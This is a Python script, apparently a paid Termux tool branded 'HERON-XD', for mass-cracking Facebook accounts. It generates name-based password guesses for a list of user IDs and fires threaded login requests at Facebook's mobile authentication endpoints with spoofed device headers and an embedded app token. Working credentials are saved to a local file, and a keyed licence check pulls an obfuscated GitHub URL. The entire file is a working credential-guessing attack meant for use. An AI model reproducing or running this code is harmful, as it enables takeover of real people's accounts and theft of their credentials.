import os,uuid,json,time,sys,random,string
try:
    import requests
except:
    os.system("pip install requests")
    import requests

try:
    import httpx
except:
    os.system("pip install httpx")
    import httpx

from concurrent.futures import ThreadPoolExecutor as ThreadPool
lin=str("\033[38;5;53m—"*32)
logo=f'''     \033[38;5;196m┏┓\033[1;97m┏┓\033[1;96m┳┓\033[1;93m┏┳\033[1;95m┏┓   \033[1;90m┓ \033[38;5;208m┳\033[38;5;75m┏┳┓\033[38;5;156m┏┓
     \033[38;5;196m┃┓\033[1;97m┣┫\033[1;96m┃┃ \033[1;93m┃\033[1;95m┣┫ \033[38;5;183m– \033[1;90m┃ \033[38;5;208m┃ \033[38;5;75m┃ \033[38;5;156m┣ 
     \033[38;5;196m┗┛\033[1;97m┛┗\033[1;96m┛┗\033[1;93m┗┛\033[1;95m┛┗   \033[1;90m┗┛\033[38;5;208m┻ \033[38;5;75m┻ \033[38;5;156m┗┛  \033[38;5;98m10.2
\033[1;97m{lin}
\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;190mDEVELOPER  \033[38;5;183m –  \033[38;5;190mHERON AFRIDI 
\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;192mFACEBOOK    \033[38;5;183m–  \033[38;5;192mHERON AFRIDI 
\033[1;97m{lin}
\033[47m\033[38;5;136m[ BD-IND  File  Cloneing Tools ]\x1b[0m
\033[1;97m{lin}'''
def clear():
    os.system("clear")
def main():
    os.system("clear")
    print(logo)
    print("\033[38;5;21m[\033[38;5;23mA\033[38;5;21m] \033[38;5;190mBD File Clone \033[38;5;125m [FIRE]")
    print("\033[38;5;21m[\033[38;5;23mB\033[38;5;21m] \033[38;5;192mExit")
    print(lin)
    g =input("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;193mEnterOption \033[38;5;183m–\033[38;5;193m ")
    if g in ["A","a","1","01"]:
        hfil()
    elif g in ["B","b","2","02"]:
        sys.exit()
    else:
        main()

passlist=[]

from datetime import datetime 
ct=str(datetime.now())
ct2=ct.split(" ")[0]
ct3=ct2.split("-")[1]
loop=0
oks=[]
mon={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December"}
mo=mon[ct3]
da=ct2.split("-")[2]
as4="om/TEAM-ELITE1/"



def hfil():
    clear()
    print(logo)
    print("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;190mExample [\033[38;5;196m/sdcard/heron.txt\033[38;5;190m]")
    
    fl=input("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;192mFile Path   \033[38;5;183m–\033[38;5;192m ")
    try:
        fileeee=open(fl,"r").read().splitlines()
    except:
        hfil()
    submit_def(fileeee)
as3="c"

as5="database/main/App.txt"

def submit_def(fileeee):
    global passlist,mo,da
    os.system("clear")
    print(logo)
    print("\033[38;5;21m[\033[38;5;23mA\033[38;5;21m] \033[38;5;190mMathod v1")
    print("\033[38;5;21m[\033[38;5;23mB\033[38;5;21m] \033[38;5;192mMathod v2 ")
    print(lin)
    ma=input("\033[38;5;21m[\033[38;5;23m#\033[38;5;21m] \033[38;5;193mEnterOption \033[38;5;183m–\033[38;5;193m ")
    tl=str(len(fileeee))
    with ThreadPool (max_workers=120) as feel:
        clear()
        print(logo)
        print(f" \033[38;5;196mIf No Result Use Airplane Mode")
        print(f"    \033[38;5;83mCrack\033[38;5;19m/\033[38;5;202mMath  \033[38;5;183m–  \033[38;5;83m{tl}\033[38;5;19m/\033[38;5;202m{ma} ")
        print(lin)
        for users in fileeee:
            uid=users.split("|")[0]
            pwx=[]
            Names=users.split("|")[1]
            names=Names.lower()
            pwx.append("57273200")
            pwx.append("57575751")
            pwx.append("59039200")
            try:
                N1=Names.split(" ")[0]
                n1=names.split(" ")[0]
                if len(N1) >=6:
                    pwx.append(N1)
                    pwx.append(n1)
                else:pass
                if len(N1) >=3:
                    pwx.append(n1+"123")
                    pwx.append(n1+"1234")
                    pwx.append(n1+"12345")
                    pwx.append(n1+"1122")
                    pwx.append(n1+"112233")
                    pwx.append(N1+"123")
                    pwx.append(N1+"1234")
                    pwx.append(N1+"12345")
                else:pass
                if len(N1) >=4:
                    pwx.append(n1+"@@")
                    pwx.append(n1+"@#")
                    pwx.append("@"+n1+"@")
                    pwx.append(n1+"##")
                    pwx.append(n1+"$$")
                    pwx.append(n1+"@@##")
                    pwx.append(n1+"&&")
                    pwx.append(N1+"@@")
                    pwx.append(N1+"@#")
                    pwx.append(N1+"##")
                    pwx.append(N1+"$$")
                else:pass
                if len(N1) >=5:
                    pwx.append(n1+"@")
                    pwx.append(n1+"#")
                    pwx.append("@"+n1)
                    pwx.append(N1+"@")
                    pwx.append(N1+"#")
                else:pass
                
            except:pass
            try:
                N2=Names.split(" ")[1]
                n2=names.split(" ")[1]
                if len(N2) >=6:
                    pwx.append(N2)
                    pwx.append(n2)
                else:pass
                if len(N2) >=3:
                    pwx.append(n2+"123")
                    pwx.append(n2+"1234")
                    pwx.append(n2+"12345")
                    pwx.append(n2+"1122")
                    pwx.append(n2+"112233")
                    pwx.append(N2+"123")
                    pwx.append(N2+"1234")
                    pwx.append(N2+"12345")
                else:pass
                if len(N2) >=4:
                    pwx.append(n2+"@@")
                    pwx.append(n2+"@#")
                    pwx.append(n2+"##")
                    pwx.append("@"+n2+"@")
                    pwx.append(n2+"$$")
                    pwx.append(n2+"&&")
                    pwx.append(n2+"@@##")
                    pwx.append(N2+"@@")
                    pwx.append(N2+"@#")
                    pwx.append(N2+"##")
                    pwx.append(N2+"$$")
                else:pass
                if len(N2) >=5:
                    pwx.append(n2+"@")
                    pwx.append(n2+"#")
                    pwx.append("@"+n2)
                    pwx.append(N2+"@")
                    pwx.append(N2+"#")
                else:pass
                pwx.append(n1+n2+"123")
                pwx.append(n1+n2+"1234")
                pwx.append(n1+n2+"12345")
                pwx.append(n1+n2+"@@")
                pwx.append(n1+n2+"@#")
                pwx.append(n1+" "+n2)
                pwx.append(N1+" "+N2)
                pwx.append(n1+" "+n2+"123")
                pwx.append(N1+" "+N2+"123")
            except:pass
            try:
                N3=Names.split(" ")[2]
                n3=names.split(" ")[2]
                if len(N3) >=6:
                    pwx.append(N3)
                    pwx.append(n3)
                else:pass
                if len(N3) >=3:
                    pwx.append(N3+"123")
                    pwx.append(n3+"123")
                else:pass
                pwx.append(N1+N2+N3)
                pwx.append(N1+" "+N2+" "+N3)
                pwx.append(N1+N2+N3+"123")
                pwx.append(n1+n2+n3)
                pwx.append(n1+" "+n2+" "+n3)
                pwx.append(n1+n2+n3+"123")
            except:pass
            if ma in ["1","01","A","a"]:
                feel.submit(file_subb,uid,pwx)
            else:
                 feel.submit(file_subb2,uid,pwx)
    results()

def results():
    print("\r\r \n")
    print(lin)
    print(f" \033[38;5;46mTotall oks : {str(len(oks))}")
    print(f" \033[38;5;46mCrack Completed Bro...")
    print(lin)
    sys.exit()

def file_subb(uid,pwx):
    global oks,loop,mo,da
    sm=random.choice(["#","$","+","%","✓","=","÷"])
    lopco=random.choice(["\033[38;5;196m","\033[38;5;197m","\033[38;5;198m","\033[38;5;199m","\033[38;5;200m","\033[38;5;201m","\033[38;5;160m","\033[38;5;161m","\033[38;5;162m","\033[38;5;163m","\033[38;5;164m","\033[38;5;165m"])
    nb=random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m","\033[1;90m"])
    sys.stdout.write(f"\r \033[38;5;190m[\033[38;5;161m{nb}HERON-XD\033[38;5;190m] \033[38;5;118m[{lopco}{loop}\033[38;5;190m|\033[38;5;183m{len(oks)}\033[38;5;190m\033[38;5;118m] [\033[38;5;183m{sm}\033[38;5;190m\033[38;5;118m]\r");sys.stdout.flush()
    rx=httpx.Client()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            q= rx.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers).json()
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            if "session_key" in q:
                print(f"\r\r\033[38;5;190m[\033[38;5;161mLIVE\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                open("/sdcard/ganja-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(q):
                print(f"\r\r\033[38;5;190m[\033[38;5;161mLIVE\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                open("/sdcard/ganja-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in str(q):
                print(f"\r\r\033[38;5;190m[\033[38;5;161mDETH\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                break
            elif twf in str(q):
                print(f"\r\r\033[38;5;190m[\033[38;5;161m2FID\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(30)
"""

head =

url1= 
"""
def file_subb2(uid,pwx):
    global oks,loop,mo,da
    sm=random.choice(["#","$","+","%","✓","=","÷"])
    lopco=random.choice(["\033[38;5;196m","\033[38;5;197m","\033[38;5;198m","\033[38;5;199m","\033[38;5;200m","\033[38;5;201m","\033[38;5;160m","\033[38;5;161m","\033[38;5;162m","\033[38;5;163m","\033[38;5;164m","\033[38;5;165m"])
    nb=random.choice(["\033[1;97m","\033[1;96m","\033[1;95m","\033[1;94m","\033[1;93m","\033[1;92m","\033[1;91m","\033[1;90m"])
    sys.stdout.write(f"\r \033[38;5;190m[\033[38;5;161m{nb}HERON-XD\033[38;5;190m] \033[38;5;118m[{lopco}{loop}\033[38;5;190m|\033[38;5;183m{len(oks)}\033[38;5;190m\033[38;5;118m] [\033[38;5;183m{sm}\033[38;5;190m\033[38;5;118m]\r");sys.stdout.flush()
    rx=httpx.Client()
    try:
        
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]"
            data = {'adid':str(uuid.uuid4()),
            'email':uid,
            'password':ps,
            'cpl':'true',
            'credentials_type':'device_based_login_password',
            "source": "device_based_login",
            'error_detail_type':'button_with_disabled',
            'source':'login',
            'format':'json',
            'generate_session_cookies':'1',
            'generate_analytics_claim':'1',
            'generate_machine_id':'1',
            "locale":"en_US",
            "client_country_code":"US",
            'device':'',
            'device_id':str(uuid.uuid4()),
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            headers = {
            'content-type':'application/x-www-form-urlencoded',
            'x-fb-sim-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-type':'unknown',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent':user_agent,
            'x-fb-net-hni':str(random.randint(2e4,4e4)),
            'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
            'x-fb-connection-quality':'EXCELLENT',
            'x-fb-friendly-name':'authenticate',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':     'Liger'}
            q= rx.post('https://b-api.facebook.com/method/auth.login',data=data,headers=headers).json()
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            if "session_key" in q:
                print(f"\r\r\033[38;5;190m[\033[38;5;161mLIVE\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                open("/sdcard/ganja-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(q):
                print(f"\r\r\033[38;5;190m[\033[38;5;161mLIVE\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                open("/sdcard/ganja-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in str(q):
                print(f"\r\r\033[38;5;190m[\033[38;5;161mDETH\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                break
            elif twf in str(q):
                print(f"\r\r\033[38;5;190m[\033[38;5;161m2FID\033[38;5;190m] \033[38;5;118m{uid} \033[38;5;183m> \033[38;5;118m{ps}    ")
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(30)
#

as1="https://raw."
as2="githubusercontent."

ass=as1+as2+as3+as4+as5
def apvdef():
    global ass
    a=str(os.geteuid())
    b=str(os.getlogin())
    y="".join(a+b)
    key=f"H{y}N"
    row=httpx.get(ass).text
    if key in row:
        main()
    else:
        os.system("clear")
        print(logo)
        print("\033[38;5;21m[\033[38;5;23m$\033[38;5;21m] \033[38;5;190mFirst Get Permission To Use")
        print("\033[38;5;21m[\033[38;5;23m$\033[38;5;21m] \033[38;5;192mYour Key : "+key)
        print(lin)
        print("\033[38;5;21m[\033[38;5;23m$\033[38;5;21m] \033[38;5;183mMessage Me to Buy :)")
        print(lin)
        os.system("xdg-open https://m.me/Freestyle.0fficial")
        sys.exit()

apvdef()


